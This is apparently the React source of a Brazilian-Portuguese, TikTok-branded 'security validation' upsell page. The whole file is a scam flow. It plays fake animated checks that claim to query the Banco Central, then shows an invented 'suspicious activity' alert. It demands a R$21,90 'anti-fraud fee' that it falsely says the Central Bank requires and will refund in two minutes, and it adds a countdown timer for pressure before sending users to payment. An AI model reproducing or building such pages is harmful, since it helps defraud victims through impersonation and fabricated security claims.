import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Search, AlertTriangle, Lock, Shield, Check, CreditCard, Clock } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const RED = "#FE2B54";
const GREEN = "#10B981";
const UPSELL2_TAX = 21.90;

type Screen = "verification" | "problem" | "main";

const verificationSteps = [
  "Verificando dados da conta",
  "Validando informações pessoais",
  "Conectando com sistema bancário",
  "Consultando Banco Central",
];

const Upsell2 = () => {
  const [screen, setScreen] = useState<Screen>("verification");
  const [visibleSteps, setVisibleSteps] = useState(0);
  const [countdown, setCountdown] = useState(4 * 60);
  const [visible, setVisible] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell2", content_type: "security_validation" } });

    const timers = verificationSteps.map((_, i) =>
      setTimeout(() => setVisibleSteps(i + 1), 1500 * (i + 1))
    );
    const problemTimer = setTimeout(() => setScreen("problem"), 7500);
    const mainTimer = setTimeout(() => {
      setScreen("main");
      requestAnimationFrame(() => setVisible(true));
    }, 9500);

    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(problemTimer);
      clearTimeout(mainTimer);
    };
  }, []);

  useEffect(() => {
    if (screen !== "main") return;
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [screen]);

  const mins = String(Math.floor(countdown / 60)).padStart(2, "0");
  const secs = String(countdown % 60).padStart(2, "0");

  const handlePagar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell2", value: UPSELL2_TAX } });
    navigate("/pagamento");
  };

  const fadeUp = (delay: number) => ({
    opacity: visible ? 1 : 0,
    transform: visible ? "translateY(0)" : "translateY(18px)",
    transition: `opacity 0.5s ease ${delay}s, transform 0.5s ease ${delay}s`,
  });

  return (
    <div style={{ fontFamily: FONT, background: "#F5F5F5", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{
        width: "100%", background: "#fff", padding: "14px 0",
        borderBottom: "1px solid #eee",
        display: "flex", justifyContent: "center",
        position: "sticky", top: 0, zIndex: 100,
        boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
      }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 22 }} loading="eager" decoding="async" />
      </div>

      <div style={{ maxWidth: 449, margin: "0 auto", width: "100%", flex: 1, padding: "0 12px" }}>

        {/* ─── Tela 1: Verificação ─── */}
        {screen === "verification" && (
          <div style={{ padding: "60px 12px", textAlign: "center", minHeight: "70vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
            <div style={{
              width: 72, height: 72,
              background: GREEN,
              borderRadius: "50%",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 24px",
              boxShadow: `0 4px 24px rgba(16,185,129,0.3), 0 0 0 8px rgba(16,185,129,0.08)`,
              animation: "pulse 2s infinite",
            }}>
              <Search size={28} color="#fff" />
            </div>

            <p style={{ fontSize: 15, color: "#666", fontWeight: 500, marginBottom: 8 }}>
              Verificando segurança da transação
            </p>

            <div style={{ display: "flex", justifyContent: "center", gap: 6, margin: "20px 0" }}>
              {[0, 1, 2].map((i) => (
                <div
                  key={i}
                  style={{
                    width: 8, height: 8, borderRadius: "50%", background: RED,
                    animation: `dotPulse 1.4s infinite ease-in-out`,
                    animationDelay: `${-0.32 + i * 0.16}s`,
                  }}
                />
              ))}
            </div>

            {verificationSteps.map((step, i) => (
              <p
                key={i}
                style={{
                  fontSize: 13, color: "#848286", marginBottom: 4,
                  opacity: i < visibleSteps ? 1 : 0,
                  transform: i < visibleSteps ? "translateY(0)" : "translateY(8px)",
                  transition: "opacity 0.5s ease, transform 0.5s ease",
                }}
              >
                ✓ {step}
              </p>
            ))}
          </div>
        )}

        {/* ─── Tela 2: Problema Detectado ─── */}
        {screen === "problem" && (
          <div style={{ padding: "60px 12px", textAlign: "center", minHeight: "70vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
            <div style={{
              width: 72, height: 72,
              background: RED,
              borderRadius: "50%",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 24px",
              boxShadow: `0 4px 24px rgba(254,43,84,0.3), 0 0 0 8px rgba(254,43,84,0.08)`,
              animation: "pulse 1.5s infinite",
            }}>
              <AlertTriangle size={28} color="#fff" />
            </div>

            <p style={{ fontSize: 16, color: RED, fontWeight: 700, marginBottom: 10 }}>
              Problema Detectado
            </p>
            <p style={{ fontSize: 13, color: "#666", lineHeight: 1.6, maxWidth: 300 }}>
              Foi identificada uma atividade suspeita. É necessária uma validação adicional de segurança.
            </p>
          </div>
        )}

        {/* ─── Tela 3: Validação de Segurança ─── */}
        {screen === "main" && (
          <div style={{ padding: "16px 0 110px" }}>
            {/* Status Card */}
            <div style={{
              ...fadeUp(0.05),
              background: "#fff", borderRadius: 16, padding: "28px 20px 24px",
              boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
              textAlign: "center",
            }}>
              <div style={{
                ...fadeUp(0.1),
                width: 56, height: 56,
                background: RED,
                borderRadius: "50%",
                display: "flex", alignItems: "center", justifyContent: "center",
                margin: "0 auto 16px",
                boxShadow: `0 4px 20px rgba(254,43,84,0.25), 0 0 0 6px rgba(254,43,84,0.08)`,
              }}>
                <Lock size={24} color="#fff" />
              </div>
              <h1 style={{ ...fadeUp(0.15), color: "#000", fontSize: 20, fontWeight: 700, marginBottom: 8 }}>
                Validação de Segurança
              </h1>
              <p style={{ ...fadeUp(0.2), fontSize: 13, color: "#666", lineHeight: 1.6, maxWidth: 300, margin: "0 auto" }}>
                Seu saque precisa de uma verificação adicional para ser liberado
              </p>
            </div>

            {/* Alert Card */}
            <div style={{
              ...fadeUp(0.25),
              background: "#fff", borderRadius: 16, padding: "20px",
              marginTop: 12,
              boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
              borderLeft: `4px solid ${RED}`,
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, color: RED, fontSize: 14, fontWeight: 700, marginBottom: 10 }}>
                <AlertTriangle size={16} />
                Medida de Segurança
              </div>
              <p style={{ fontSize: 13, color: "#666", lineHeight: 1.6 }}>
                O <strong style={{ color: "#000", fontWeight: 600 }}>Banco Central</strong> exige
                uma validação de segurança. A taxa de{" "}
                <strong style={{ color: "#000", fontWeight: 600 }}>
                  R$ {UPSELL2_TAX.toFixed(2).replace(".", ",")}
                </strong>{" "}
                será reembolsada em 2 minutos após o pagamento.
              </p>
            </div>

            {/* Fee Card */}
            <div style={{
              ...fadeUp(0.3),
              background: "#fff", borderRadius: 16, padding: "24px 20px",
              marginTop: 12,
              boxShadow: "0 2px 24px rgba(0,0,0,0.06), 0 1px 4px rgba(0,0,0,0.04)",
              textAlign: "center",
            }}>
              <div style={{
                display: "inline-flex", alignItems: "center", gap: 6,
                background: RED, color: "#fff",
                padding: "6px 14px", borderRadius: 99,
                fontSize: 11, fontWeight: 700, marginBottom: 16,
                boxShadow: `0 3px 10px rgba(254,43,84,0.2)`,
              }}>
                <Shield size={13} />
                TAXA ANTI-FRAUDE
              </div>

              <p style={{ fontSize: 28, fontWeight: 800, color: RED, marginBottom: 6 }}>
                R$ {UPSELL2_TAX.toFixed(2).replace(".", ",")}
              </p>
              <p style={{ fontSize: 12, color: "#848286", marginBottom: 20 }}>
                Valor reembolsável em 2 minutos
              </p>

              {/* Benefits */}
              <div style={{ display: "flex", flexDirection: "column", gap: 10, margin: "16px 0 20px" }}>
                {["Liberação imediata do saque", "Proteção garantida pelo BC", "Reembolso automático"].map((text) => (
                  <div key={text} style={{
                    display: "flex", alignItems: "center", gap: 10,
                    background: "#F8F9FB", padding: "10px 14px", borderRadius: 10,
                    boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8), 0 1px 3px rgba(0,0,0,0.03)",
                  }}>
                    <div style={{
                      width: 22, height: 22, background: GREEN, borderRadius: "50%",
                      display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
                      boxShadow: `0 2px 6px rgba(16,185,129,0.25)`,
                    }}>
                      <Check size={11} color="#fff" strokeWidth={3} />
                    </div>
                    <span style={{ fontSize: 13, color: "#333", fontWeight: 500, textAlign: "left" }}>{text}</span>
                  </div>
                ))}
              </div>

              {/* CTA */}
              <button
                onClick={handlePagar}
                style={{
                  width: "100%", border: 0, borderRadius: 99,
                  padding: "17px 20px", fontSize: 15, fontWeight: 700,
                  cursor: "pointer", color: "#fff",
                  background: GREEN,
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  boxShadow: `0 6px 24px rgba(16,185,129,0.3), 0 2px 6px rgba(16,185,129,0.15), inset 0 1px 0 rgba(255,255,255,0.15)`,
                  fontFamily: FONT, letterSpacing: "0.2px",
                  transition: "transform 0.15s ease",
                }}
                onMouseDown={e => (e.currentTarget.style.transform = "scale(0.98)")}
                onMouseUp={e => (e.currentTarget.style.transform = "scale(1)")}
                onMouseLeave={e => (e.currentTarget.style.transform = "scale(1)")}
              >
                <CreditCard size={17} />
                PAGAR E LIBERAR SAQUE
              </button>
            </div>

            {/* Timer + Security */}
            <div style={{
              ...fadeUp(0.35),
              background: "#fff", borderRadius: 12, padding: "14px 16px",
              marginTop: 12,
              boxShadow: "0 1px 12px rgba(0,0,0,0.04)",
              display: "flex", flexDirection: "column", alignItems: "center", gap: 10,
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 500, color: "#848286" }}>
                <Clock size={13} />
                Validação disponível por:{" "}
                <span style={{ color: RED, fontWeight: 700, fontSize: 13, background: "rgba(254,43,84,0.06)", padding: "2px 8px", borderRadius: 6 }}>
                  {mins}:{secs}
                </span>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11, color: "#aaa", fontWeight: 500 }}>
                <Shield size={11} color={GREEN} />
                Pagamento 100% seguro e protegido
              </div>
            </div>

            {/* Footer */}
            <p style={{ ...fadeUp(0.4), textAlign: "center", fontSize: 11, color: "#aaa", marginTop: 14, lineHeight: 1.5, padding: "0 8px" }}>
              Esta validação é necessária para conclusão segura da transferência conforme exigido pelo Banco Central.
            </p>
          </div>
        )}
      </div>

      <style>{`
        @keyframes pulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.05); }
          100% { transform: scale(1); }
        }
        @keyframes dotPulse {
          0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
          40% { transform: scale(1); opacity: 1; }
        }
      `}</style>
    </div>
  );
};

export default Upsell2;
